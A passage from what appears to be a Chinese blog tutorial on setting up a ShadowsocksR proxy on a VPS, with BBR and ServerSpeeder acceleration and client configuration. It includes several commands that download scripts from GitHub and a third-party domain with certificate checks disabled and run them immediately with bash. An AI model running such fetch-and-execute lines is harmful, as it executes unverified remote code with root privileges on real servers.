1.2_ticket_auth容易受到干扰！请选择除tls开头以外的其它混淆！！！）</p><p>进行混淆插件的设置后，会依次提示你对设备数、单线程限速和端口总限速进行设置，默认值是不进行限制，个人使用的话，选择默认即可，即直接敲回车键。</p><p>注意：关于限制设备数，这个协议必须是非原版且不兼容原版才有效，也就是必须使用SSR协议的情况下，才有效！</p><p>之后代码就正式自动部署了，到下图所示的位置，提示你下载文件，输入：y</p><p>耐心等待一会，出现下面的界面即部署完成：</p><p>根据上图就可以看到自己设置的SSR账号信息，包括IP、端口、密码、加密方式、协议插件、混淆插件，这些信息需要填入你的SSR客户端。如果之后想修改账号信息，直接输入快捷管理命令：bash ssr.sh 进入管理界面，选择相应的数字来进行一键修改。例如：</p><p>脚本演示结束。</p><p>此脚本是开机自动启动，部署一次即可。最后可以重启服务器确保部署生效（一般情况不重启也可以）。重启需要在命令栏里输入reboot ，输入命令后稍微等待一会服务器就会自动重启，一般重启过程需要2～5分钟，重启过程中Xshell会自动断开连接，等VPS重启好后才可以用Xshell软件进行连接。如果部署过程中卡在某个位置超过10分钟，可以用xshell软件断开，然后重新连接你的ip，再复制代码进行部署。</p><p>第三步：一键加速VPS服务器</p><p>此加速教程为谷歌BBR加速,Vultr的服务器框架可以装BBR加速，加速后对速度的提升很明显，所以推荐部署加速脚本。该加速方法是开机自动启动，部署一次就可以了。</p><p>按照第二步的步骤，连接服务器ip，登录成功后，在命令栏里粘贴以下代码：</p><p>【谷歌BBR加速教程】</p><p>yum -y install wget</p><p>wget –no-check-certificate <a href="https://github.com/teddysun/across/raw/master/bbr.sh">https://github.com/teddysun/across/raw/master/bbr.sh</a></p><p>chmod +x bbr.sh</p><p>./bbr.sh</p><p>把上面整个代码复制后粘贴进去，不动的时候按回车，然后耐心等待，最后重启vps服务器即可。</p><p>演示开始，如图：</p><p>复制并粘贴代码后，按回车键确认</p><p>如下图提示，按任意键继续部署</p><p>部署到上图这个位置的时候，等待3～6分钟</p><p>最后输入y重启服务器，如果输入y提示command not found ，接着输入reboot来重启服务器，确保加速生效，bbr加速脚本是开机自动启动，装一次就可以了。</p><p>购买vps服务器后，ip有了，通过部署，端口、密码、加密方式、协议和混淆也有了，最后将这些信息填入SSR客户端就可以访问外网啦。</p><p>有了账号后，打开SSR客户端，填上信息，这里以windows版的SSR客户端为例子：</p><p>在对应的位置，填上服务器ip、服务器端口、密码、加密方式、协议和混淆，最后将浏览器的代理设置为（http）127.0.0.1和1080即可。账号的端口号就是你自己设置的，而要上网的浏览器的端口号是1080，固定的，谷歌浏览器可以通过 SwitchyOmega 插件来设置。</p><p>启动SSR客户端后，右键SSR客户端图标，选择第一个“系统代理模式”，里面有3个子选项，选择”全局模式“，之后就可以用浏览器设置好了的代理模式（http）127.0.0.1和1080翻墙，此模式下所有的网站都会走SSR代理。（适合新手）</p><p>ssr9000</p><p>方法二<br>最近准备新安装一个。发现上面执行安装时，出错，安装不下去，<br>执行以下命令</p><p>wget –no-check-certificate <a href="https://freed.ga/github/shadowsocksR.sh">https://freed.ga/github/shadowsocksR.sh</a>; bash shadowsocksR.sh<br>若提示：wget :command not found<br>请执行：yum install wget -y<br>然后再按照提示走就行了</p><p>QQ截图20180802123036</p><p>这张图注意保存<br>走到这一步，还有些不够，网速很慢，几乎慢到连不到网，所以进行第三步。</p><p>锐速安装<br>一键更换内核脚本（Vultr需先执行此脚本）</p><p>wget -N –no-check-certificate <a href="https://freed.ga/kernel/ruisu.sh">https://freed.ga/kernel/ruisu.sh</a> &amp;&amp; bash ruisu.sh<br>脚本安装需要1-3分钟，耐心等待服务器重启，服务器重启之后，重新连接继续安装就行了。</p><p>锐速安装脚本</p><p>wget -N –no-check-certificate <a href="https://github.com/91yun/serverspeeder/raw/master/serverspeeder.sh">https://github.com/91yun/serverspeeder/raw/master/serverspeeder.sh</a> &amp;&amp; bash serverspeeder.sh<br>QQ截图20180802123416</p><p>出现这些就算大功告成了。电脑连接可查看 上面连接教程就行了  </p><hr>]]></content>
      
      
      <categories>
          
          <category> 黑科技 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssr </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
